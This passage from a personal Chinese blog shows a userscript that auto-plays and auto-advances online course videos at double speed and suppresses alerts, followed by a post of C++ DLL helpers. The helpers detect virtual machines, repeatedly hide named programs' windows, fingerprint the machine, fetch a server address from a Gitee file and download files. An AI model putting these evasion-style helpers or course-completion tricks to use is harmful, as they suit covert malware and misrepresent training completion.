class="string">&#x27;video&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (video) &#123;</span><br><span class="line">            <span class="keyword">const</span> clickEvent = <span class="keyword">new</span> <span class="title class_">MouseEvent</span>(<span class="string">&#x27;click&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">view</span>: <span class="variable language_">window</span>,</span><br><span class="line">                <span class="attr">bubbles</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">cancelable</span>: <span class="literal">true</span></span><br><span class="line">            &#125;);</span><br><span class="line">            video.<span class="title function_">dispatchEvent</span>(clickEvent);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;模拟点击 video 元素&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;未找到 video 元素&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测视频是否为2倍速播放</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">checkPlaybackRate</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>).<span class="property">playbackRate</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">const</span> currentVideo = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (currentVideo.<span class="property">playbackRate</span> == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;2倍速播放成功&#x27;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">setTimeout</span>(checkPlaybackRate, <span class="number">500</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">checkCourseLearned</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测本节课是否学过</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">checkCourseLearned</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;checkCourseLearned调用&#x27;</span>);</span><br><span class="line">        <span class="comment">// 查找所有具有指定类名的元素</span></span><br><span class="line">        <span class="keyword">const</span> items = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.resource-item.resource-item-train.resource-item-active&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历这些元素</span></span><br><span class="line">        items.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// 查找 &lt;i&gt; 标签</span></span><br><span class="line">            <span class="keyword">const</span> iElement = item.<span class="title function_">querySelector</span>(<span class="string">&#x27;i&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 检查 &lt;i&gt; 标签的 title 属性是否为 &quot;已学完&quot;</span></span><br><span class="line">            <span class="keyword">if</span> (iElement &amp;&amp; iElement.<span class="property">title</span> === <span class="string">&#x27;已学完&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;找到一个已学完的资源项:&#x27;</span>, item);</span><br><span class="line">                <span class="comment">// 如果这节课学完了，就播放下一节课</span></span><br><span class="line">                <span class="title function_">playNextVideo</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//如果这节课没学完，监听视频播放结束事件</span></span><br><span class="line">                <span class="title function_">listenVideoEnd</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听视频播放结束事件</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">listenVideoEnd</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> currentVideo = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;listenVideoEnd调用&#x27;</span>);</span><br><span class="line">        <span class="comment">// 监听视频播放结束事件</span></span><br><span class="line">        currentVideo.<span class="title function_">addEventListener</span>(<span class="string">&#x27;ended&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;当前视频播放结束，正在尝试播放下一个视频...&#x27;</span>);</span><br><span class="line">            <span class="title function_">playNextVideo</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 播放下一个视频</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">playNextVideo</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;playNextVideo调用&#x27;</span>);</span><br><span class="line">        <span class="comment">// 找到当前激活的资源项</span></span><br><span class="line">        <span class="keyword">const</span> activeItem = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.resource-item.resource-item-train.resource-item-active&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!activeItem) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;没有找到当前激活的资源项&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(activeItem)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 找到下一个资源项</span></span><br><span class="line">        <span class="keyword">let</span> nextItem = activeItem.<span class="property">nextElementSibling</span>;</span><br><span class="line">        <span class="keyword">while</span> (nextItem &amp;&amp; (!nextItem.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&#x27;resource-item&#x27;</span>) || !nextItem.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&#x27;resource-item-train&#x27;</span>))) &#123;</span><br><span class="line">            nextItem = nextItem.<span class="property">nextElementSibling</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!nextItem) &#123;</span><br><span class="line">            <span class="comment">// 如果已经是最后一个，循环回到第一个</span></span><br><span class="line">            nextItem = activeItem.<span class="property">parentNode</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.resource-item.resource-item-train&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nextItem) &#123;</span><br><span class="line">            <span class="comment">// 模拟点击下一个资源项</span></span><br><span class="line">            <span class="title function_">simulateClick</span>(nextItem, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="comment">// 延时处理alert并播放视频</span></span><br><span class="line">                <span class="built_in">setTimeout</span>(handleAlertAndPlayVideo, <span class="number">3000</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;没有找到下一个资源项或资源项不符合条件&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_">hasVideo</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模拟点击</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">simulateClick</span>(<span class="params">element, callback</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> clickEvent = <span class="keyword">new</span> <span class="title class_">MouseEvent</span>(<span class="string">&#x27;click&#x27;</span>, &#123;</span><br><span class="line">            <span class="string">&#x27;view&#x27;</span>: <span class="variable language_">window</span>,</span><br><span class="line">            <span class="string">&#x27;bubbles&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;cancelable&#x27;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;);</span><br><span class="line">        element.<span class="title function_">dispatchEvent</span>(clickEvent);</span><br><span class="line">        <span class="comment">// 如果需要执行回调函数，确保点击事件处理完毕后执行</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(callback, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理alert并播放视频</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">handleAlertAndPlayVideo</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// 这里假设alert是点击后弹出的，并且需要用户确认</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">alert</span>) &#123;</span><br><span class="line">            <span class="comment">// 模拟点击alert的确定按钮</span></span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span> (<span class="params">message</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;模拟点击alert确定按钮&#x27;</span>);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断视频播放时长是否等于总时长</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isVideoDurationEqual</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> video = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (video) &#123;</span><br><span class="line">            <span class="keyword">const</span> currentTime = video.<span class="property">currentTime</span>;</span><br><span class="line">            <span class="keyword">const</span> duration = video.<span class="property">duration</span>;</span><br><span class="line">            <span class="keyword">const</span> tolerance = <span class="number">1</span>; <span class="comment">// 允许的误差范围，单位为秒</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">abs</span>(currentTime - duration) &lt;= tolerance) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;视频播放时长等于总时长&#x27;</span>);</span><br><span class="line">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="comment">// 点击video元素，触发视频暂停</span></span><br><span class="line">                    <span class="title function_">simulateClickOnVideo</span>();</span><br><span class="line">                &#125;, <span class="number">3000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>安装篡改猴插件</p>
<p><img src="/2024/08/01/jsScript/image-20240802001948601.png" alt="image-20240802001948601"></p>
<p>打开管理面板</p>
<p><img src="/2024/08/01/jsScript/image-20240802002031717.png" alt="image-20240802002031717"></p>
<p>添加脚本</p>
<p><img src="/2024/08/01/jsScript/image-20240802002101858.png" alt="image-20240802002101858"></p>
<p>将代码扔进去，ctrl + s保存</p>
<p><img src="/2024/08/01/jsScript/image-20240802002125428.png" alt="image-20240802002125428"></p>
<p><img src="/2024/08/01/jsScript/image-20240802002214549.png" alt="image-20240802002214549"></p>
<p>启用</p>
<p><img src="/2024/08/01/jsScript/image-20240802002521991.png" alt="image-20240802002521991"></p>
<p>脚本成功运行</p>
<h2 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h2><p>其实是懒得写还没实现的功能</p>
<p>比如：当最后一个课程学完后，需要打开下一个折叠的层</p>
<p><img src="/2024/08/01/jsScript/image-20240802003855298.png" alt="image-20240802003855298"><img src="/2024/08/01/jsScript/image-20240802003912394.png" alt="image-20240802003912394"></p>
<p>才能自动播放下一个折叠层中的视频</p>
<p>所以播放完一个视频应该先遍历一下所有<code>.resource-item.resource-item-train</code>的类中的所有<code>&lt;i&gt;</code>标签的title是否都为“已学完”，然后再找到折叠层的类，使用浏览器模拟点击让他折叠打开，然后再点击课程…………因为这里没必要所以没写</p>
<p>折叠层的类：<img src="/2024/08/01/jsScript/image-20240802004238259.png" alt="image-20240802004238259"></p>
<p>判断点击这里就可以实现自动展开了</p>
]]></content>
  </entry>
  <entry>
    <title>My Dlls</title>
    <url>/2024/07/20/Dlls/</url>
    <content><![CDATA[<p>下面是写程序时自己写的一些函数，可以直接拿来用</p>
<p>项目地址：<a href="https://github.com/Creeeeeeeeeeper/Codes/tree/master/dllCompilation">Github</a></p>
<p>DLL下载：<a href="https://github.com/Creeeeeeeeeeper/Codes/raw/master/dllCompilation/Debug/dllCompilation.dll">dllCompilation</a></p>
<span id="more"></span>

<h2 id="属性页配置"><a href="#属性页配置" class="headerlink" title="属性页配置"></a>属性页配置</h2><p>没有安装OpenSSL先下载安装 <a href="https://wwl.lanzouv.com/idJw62533kih">OpenSSL-Win32</a> <a href="https://wwl.lanzouv.com/ijudd2533h3e">OpenSSL-Win64</a> pswd:1234</p>
<p>链接库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置属性 =&gt; C/C++ =&gt; 常规 =&gt; 附加包含目录 D:\OpenSSL\OpenSSL-Win32\include</span><br><span class="line">配置属性 =&gt; 链接器 =&gt; 常规 =&gt; 附加库目录 D:\OpenSSL\OpenSSL-Win32\lib\</span><br><span class="line">配置属性 =&gt; 链接器 =&gt; 输入 =&gt; libssl.lib</span><br><span class="line">						  libcrypto.lib</span><br></pre></td></tr></table></figure>

<h2 id="功能-pch-h"><a href="#功能-pch-h" class="headerlink" title="功能(pch.h)"></a>功能(pch.h)</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PCH_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PCH_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 10000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/ssl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;d3d9.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/md5.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iphlpapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;d3d9.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;iphlpapi.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;psapi.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;d3d9.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测程序是否运行在虚拟机中 非虚拟机:0 虚拟机:1 Direct3D初始化失败:2 获取适配器信息失败:3</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function">DWORD WINAPI <span class="title">GPUProcDetect</span><span class="params">(LPVOID lpParameter)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传入进程名和类名，关闭所有在任务栏中打开的这些程序，但是不结束这个程序本身的进程</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">int</span> <span class="title">killtasks</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* targetTitles[], <span class="type">size_t</span> targetTitlesSize, <span class="type">const</span> <span class="type">char</span>* targetClassNames[], <span class="type">size_t</span> targetClassNamesSize)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取UUID的md5值，返回md5值字符串，可以作为识别计算机唯一标识</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">char</span>* <span class="title">getUUIDmd5</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过个人Gitee仓库中获取IP和Port，一般用于程序需要内网穿透并需要客户端自动获取服务端IP和Port的场景（因为内网穿透的IP和Port经常变化）</span></span><br><span class="line"><span class="comment">// 使用方法：在个人仓库中创建一个.txt文件，内容格式为：127.0.0.1 8080，前面为IP后面为Port，中间使用空格分隔</span></span><br><span class="line"><span class="comment">// 第一个参数：点击该.txt文件，直接复制url，如：https://gitee.com/zzzzzyg/socket/blob/master/configuration.txt</span></span><br><span class="line"><span class="comment">// 第二个参数：点击.txt文件后，点击右边的原始数据，仅复制路径，如：/zzzzzyg/socket/raw/master/configuration.txt</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">char</span>* <span class="title">getIPaPORT</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* url, <span class="type">const</span> <span class="type">char</span>* path)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查文件是否不存在，不存在返回1，存在返回0</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">int</span> <span class="title">file_notexists</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filename)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用curl下载文件到指定路径，url须为文件直链链接，文件路径使用/分隔符，不要使用\分隔符</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">curlDownload</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* path, <span class="type">const</span> <span class="type">char</span>* url)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义打印</span></span><br><span class="line"><span class="comment">// 第一个参数：要打印的字符串</span></span><br><span class="line"><span class="comment">// 第二个参数：打印样式。0重置所有的样式 1粗体 2暗色(浅色) 3斜体 4下划线 5慢速闪烁 6快速闪烁 7反色 8隐藏 9删除线</span></span><br><span class="line"><span class="comment">// 第三个参数：前景色。0黑色 1红色 2绿色 3黄色 4蓝色 5洋红色 6青色 7白色</span></span><br><span class="line"><span class="comment">// 第四个参数：背景色。0黑色 1红色 2绿色 3黄色 4蓝色 5洋红色 6青色 7白色</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">printc</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str, <span class="type">char</span>* style, <span class="type">int</span> ForegroundColor, <span class="type">int</span> BackgroundColor)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//PCH_H</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="代码（2024-7-20）"><a href="#代码（2024-7-20）" class="headerlink" title="代码（2024.7.20）"></a>代码（2024.7.20）</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">containsSubstring</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str, <span class="type">const</span> <span class="type">char</span>* substr)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> lowerStr[<span class="number">128</span>];</span><br><span class="line">    <span class="type">char</span> lowerSubstr[<span class="number">128</span>];</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; str[i] &amp;&amp; i &lt; <span class="number">127</span>; i++) &#123;</span><br><span class="line">        lowerStr[i] = <span class="built_in">tolower</span>((<span class="type">unsigned</span> <span class="type">char</span>)str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    lowerStr[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; substr[i] &amp;&amp; i &lt; <span class="number">127</span>; i++) &#123;</span><br><span class="line">        lowerSubstr[i] = <span class="built_in">tolower</span>((<span class="type">unsigned</span> <span class="type">char</span>)substr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    lowerSubstr[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strstr</span>(lowerStr, lowerSubstr) != <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">GPUProcDetect</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    IDirect3D9* pD3D = <span class="built_in">Direct3DCreate9</span>(D3D_SDK_VERSION);</span><br><span class="line">    <span class="keyword">if</span> (pD3D == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    D3DADAPTER_IDENTIFIER9 adapterIdentifier;</span><br><span class="line">    HRESULT hr = pD3D-&gt;<span class="built_in">GetAdapterIdentifier</span>(D3DADAPTER_DEFAULT, <span class="number">0</span>, &amp;adapterIdentifier);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">FAILED</span>(hr)) &#123;</span><br><span class="line">        pD3D-&gt;<span class="built_in">Release</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">containsSubstring</span>(adapterIdentifier.Description, <span class="string">&quot;vmware&quot;</span>) || <span class="built_in">containsSubstring</span>(adapterIdentifier.Description, <span class="string">&quot;virtualbox&quot;</span>)) &#123;</span><br><span class="line">        pD3D-&gt;<span class="built_in">Release</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pD3D-&gt;<span class="built_in">Release</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">IsInArray</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str, <span class="type">const</span> <span class="type">char</span>** array, <span class="type">size_t</span> arraySize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; arraySize; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(str, array[i]) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL CALLBACK <span class="title">EnumWindowsProc</span><span class="params">(HWND hwnd, LPARAM lParam)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">EnumWindowsData</span> &#123;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>** targetTitles;</span><br><span class="line">        <span class="type">size_t</span> targetTitlesSize;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>** targetClassNames;</span><br><span class="line">        <span class="type">size_t</span> targetClassNamesSize;</span><br><span class="line">    &#125; *data = (<span class="keyword">struct</span> EnumWindowsData*)lParam;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> windowTitle[<span class="number">256</span>];</span><br><span class="line">    <span class="type">char</span> className[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">GetWindowTextA</span>(hwnd, windowTitle, <span class="built_in">sizeof</span>(windowTitle))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">IsInArray</span>(windowTitle, data-&gt;targetTitles, data-&gt;targetTitlesSize)) &#123;</span><br><span class="line">            <span class="built_in">ShowWindow</span>(hwnd, SW_HIDE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">GetClassNameA</span>(hwnd, className, <span class="built_in">sizeof</span>(className))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">IsInArray</span>(className, data-&gt;targetClassNames, data-&gt;targetClassNamesSize)) &#123;</span><br><span class="line">            <span class="built_in">ShowWindow</span>(hwnd, SW_HIDE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WindowProcDetect</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">EnumWindowsData</span> &#123;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>** targetTitles;</span><br><span class="line">        <span class="type">size_t</span> targetTitlesSize;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>** targetClassNames;</span><br><span class="line">        <span class="type">size_t</span> targetClassNamesSize;</span><br><span class="line">    &#125; *data = (<span class="keyword">struct</span> EnumWindowsData*)lpParameter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">EnumWindows</span>(EnumWindowsProc, (LPARAM)data);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">333</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">EnumWindowsData</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>** targetTitles;</span><br><span class="line">    <span class="type">size_t</span> targetTitlesSize;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>** targetClassNames;</span><br><span class="line">    <span class="type">size_t</span> targetClassNamesSize;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">killtasks</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* targetTitles[], <span class="type">size_t</span> targetTitlesSize, <span class="type">const</span> <span class="type">char</span>* targetClassNames[], <span class="type">size_t</span> targetClassNamesSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">EnumWindowsData</span> data = &#123;</span><br><span class="line">        targetTitles,</span><br><span class="line">        targetTitlesSize,</span><br><span class="line">        targetClassNames,</span><br><span class="line">        targetClassNamesSize</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, WindowProcDetect, &amp;data, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">compute_md5</span><span class="params">(<span class="type">const</span> <span 